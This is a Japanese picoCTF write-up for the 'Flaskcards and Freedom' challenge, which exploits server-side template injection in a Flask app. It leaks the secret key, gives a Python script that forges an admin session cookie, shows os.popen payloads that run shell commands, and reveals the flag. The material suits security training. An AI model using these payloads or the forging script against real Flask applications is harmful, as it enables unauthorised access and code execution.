# Flaskcards and Freedom

## Solve
```
There seem to be a few more files stored on the flash card server but we can't login. Can you? 
http://2018shell.picoctf.com:58184 (link)
```

## Hint 
```
There's more to the original vulnerability than meets the eye.
Can you leverage the injection technique to get remote code execution?
Sorry, but the database still reverts every 2 hours.
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83981499-53b86b80-a959-11ea-8280-2c0bcf26ccab.png)

問題のページに移動すると`11.Flaskcards`や`14.Flaskcards Skeleton Key`の問題と似たページが表示されました。

タイトルも問題文より、恐らく`SSTI`を使ってシェル実行させる問題と推測できます。

前の2つの問題で解いた方法も参考にしてやっていきます。

まずはアカウントを作成します。

アカウントを作成できたら`Create Card`で前のように`{{config}}`で中身が見れるか確かめてみます。

![2](https://user-images.githubusercontent.com/47602064/83981636-a21a3a00-a95a-11ea-8617-71984b22f01f.png)

すると上手く`SSTI`により実行されました。

```txt
Question:<Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 'c76db0dbbe5a58ad1a322d3b49923a96', 'SESSION_COOKIE_HTTPONLY': True, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_ECHO': False, 'TRAP_BAD_REQUEST_ERRORS': None, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'SERVER_NAME': None, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'JSON_SORT_KEYS': True, 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_DOMAIN': False, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'SESSION_COOKIE_SAMESITE': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_POOL_SIZE': None, 'SESSION_COOKIE_PATH': None, 'BOOTSTRAP_SERVE_LOCAL': False, 'SESSION_COOKIE_NAME': 'session', 'ENV': 'production', 'APPLICATION_ROOT': '/', 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'SQLALCHEMY_RECORD_QUERIES': None, 'JSONIFY_MIMETYPE': 'application/json', 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_BINDS': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'PREFERRED_URL_SCHEME': 'http', 'TESTING': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None, 'SESSION_COOKIE_SECURE': False, 'MAX_CONTENT_LENGTH': None, 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'TRAP_HTTP_EXCEPTIONS': False, 'DEBUG': False, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'TEMPLATES_AUTO_RELOAD': None, 'BOOTSTRAP_USE_MINIFIED': True}> 
```

この中に`secret_key`も一緒に含まれて出力されていました。

`'SECRET_KEY': 'c76db0dbbe5a58ad1a322d3b49923a96'`

これで前回の問題のように`admin:1`を含んだ`session`が生成出来ます。

<br>

今回loginした時の通信は以下のようでした。

```http
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 219
Location: http://2018shell.picoctf.com:58184/index
Vary: Cookie
Set-Cookie: session=.eJwlj8GqAjEMAP-lZw9Jk7SpP7MkaYoiKOzq6fH-3QXPw8DMX9nWnsetXN_7Jy9lu89yLbxyWVbscwlmNvTEZkNEQaJ1ttpxZrIB-tCWAYvEWMNpptYJSoroojFm6wCniMxoizQYhkkMTFIAFTHpbqE260hjYmko5VLi2Nf2fj3yefY4VPFp4L5q79lkOhFSH407jAASjpPB6X2O3H8TqOX_C8t7Pno.Eb772w.UpvjyAtHm9JARj9o9yNue-wNLH8; HttpOnly; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">

```

なのでこの`session`を使って前回使ったpythonで生成させます。

```python
#!/usr/bin/env python3

import zlib
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import base64_decode, URLSafeTimedSerializer

secret_key = 'c76db0dbbe5a58ad1a322d3b49923a96'
user_cookie = '.eJwlj8GqAjEMAP-lZw9Jk7SpP7MkaYoiKOzq6fH-3QXPw8DMX9nWnsetXN_7Jy9lu89yLbxyWVbscwlmNvTEZkNEQaJ1ttpxZrIB-tCWAYvEWMNpptYJSoroojFm6wCniMxoizQYhkkMTFIAFTHpbqE260hjYmko5VLi2Nf2fj3yefY4VPFp4L5q79lkOhFSH407jAASjpPB6X2O3H8TqOX_C8t7Pno.Eb772w.UpvjyAtHm9JARj9o9yNue-wNLH8'

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    def get_signing_serializer(self, secret_key):
        signer_kwargs = {
            'key_derivation': self.key_derivation,
            'digest_method': self.digest_method
        }
        return URLSafeTimedSerializer(
            secret_key,
            salt=self.salt,
            serializer=self.serializer,
            signer_kwargs=signer_kwargs
        )

class FlaskSessionCookieManager:
    @classmethod
    def decode(cls, secret_key, cookie):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.loads(cookie)

    @classmethod
    def encode(cls, secret_key, session):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.dumps(session)

# main
user_session = FlaskSessionCookieManager.decode(secret_key, user_cookie)
print(user_session)
admin_session = user_session
admin_session['user_id'] = '1'
print(admin_session)
print()
admin_cookie = FlaskSessionCookieManager.encode(secret_key, admin_session)
print(admin_cookie)
```

これを実行すると以下のようになります。

```
$ python3 solve.py 
{'_fresh': True, '_id': '4fefae217df51ee61be16a955805c674a271dee4a01b986ec0f35a48cb3de82d083811b58c9d67005581441af38c409a5c91e3800855a57bac8ad29ea4345615', 'csrf_token': 'b025bda0bbf277e65db33137964709c0354cbbf0', 'user_id': '18'}
{'_fresh': True, '_id': '4fefae217df51ee61be16a955805c674a271dee4a01b986ec0f35a48cb3de82d083811b58c9d67005581441af38c409a5c91e3800855a57bac8ad29ea4345615', 'csrf_token': 'b025bda0bbf277e65db33137964709c0354cbbf0', 'user_id': '1'}

.eJwlj8GqAjEMAP-lZw9Jk7SpP7MkaYoiKOzq6fH-3QXPw8DMX9nWnsetXN_7Jy9lu89yLbxyWVbscwlmNvTEZkNEQaJ1ttpxZrIB-tCWAYvEWMNpptYJSoroojFm6wCniMxoizQYhkkMTFIAFTHpbqE260hjYmko5VLi2Nf2fj3yefY4VPFp4L5q79lkOhFSH407jAASjpPB6X2O3H8TWP6_jTA-Qg.Eb7-hg.0S6cuqYhzJwu_YckeyR9GZVInJU
```

これで`session`に`admin:1`を含んだのが生成されました。

なのでこれを使って`/admin`にアクセスすると上手くアクセス出来ました。

```http
ET /admin HTTP/1.1
Host: 2018shell.picoctf.com:58184

Referer: http://2018shell.picoctf.com:58184/create_card
Cookie: _ga=GA1.2.1326079095.1591175644; session=.eJwlj8GqAjEMAP-lZw9Jk7SpP7MkaYoiKOzq6fH-3QXPw8DMX9nWnsetXN_7Jy9lu89yLbxyWVbscwlmNvTEZkNEQaJ1ttpxZrIB-tCWAYvEWMNpptYJSoroojFm6wCniMxoizQYhkkMTFIAFTHpbqE260hjYmko5VLi2Nf2fj3yefY4VPFp4L5q79lkOhFSH407jAASjpPB6X2O3H8TWP6_jTA-Qg.Eb7-hg.0S6cuqYhzJwu_YckeyR9GZVInJU
Upgrade-Insecure-Requests: 1
```

![3](https://user-images.githubusercontent.com/47602064/83981741-9a0eca00-a95b-11ea-8dd6-88f8ae45b47a.png)

<br>

このページ自体にはflagはなかったので`View/Update Comments`をクリックしてみます。

すると一覧が表示されました。

![4](https://user-images.githubusercontent.com/47602064/83981860-c119cb80-a95c-11ea-9306-aed034e9626f.png)


`new comment`があるので試しに`SSTI`してみると対策がされていて、実行されませんでした。

他にも探してみましたが、この`admin`からはありませんでした。

なので始めに`SSTI`ができた`Create Card`から探してみます。

<br>

試しに以下を挿入させてみます。

```
{{url_for.__globals__.os.popen('ls -la').read()}}
```

すると以下のように実行できて`ls`も上手く実行されています。

![4](https://user-images.githubusercontent.com/47602064/83982062-48b40a00-a95e-11ea-8aaa-6bb3666bb546.png)

```txt
Question:total 72 drwxr-x--- 3 hacksports flaskcards-and-freedom_1 4096 Oct 3 2019 . drwxr-x--x 556 root root 53248 Mar 25 2019 .. drwxr-xr-x 3 root root 4096 Mar 25 2019 app -rw-rw-r-- 1 hacksports hacksports 38 Mar 25 2019 flag -rw-rw-r-- 1 hacksports hacksports 61 Mar 25 2019 server.py -rwxr-sr-x 1 hacksports flaskcards-and-freedom_1 105 Oct 3 2019 xinet_startup.sh 
```

すると、そのまま`flag`というのがあるのが確認できました。

なので次はそれを`cat`で見てみます。

```
{{url_for.__globals__.os.popen('cat flag').read()}}
```

![5](https://user-images.githubusercontent.com/47602064/83982104-afd1be80-a95e-11ea-9ef7-8476133cbea9.png)

```txt
Question:picoCTF{R_C_E_wont_let_me_be_04eedee8} 
```

するとflagが表示されました。

<br><br>

## FLAG: picoCTF{R_C_E_wont_let_me_be_04eedee8}
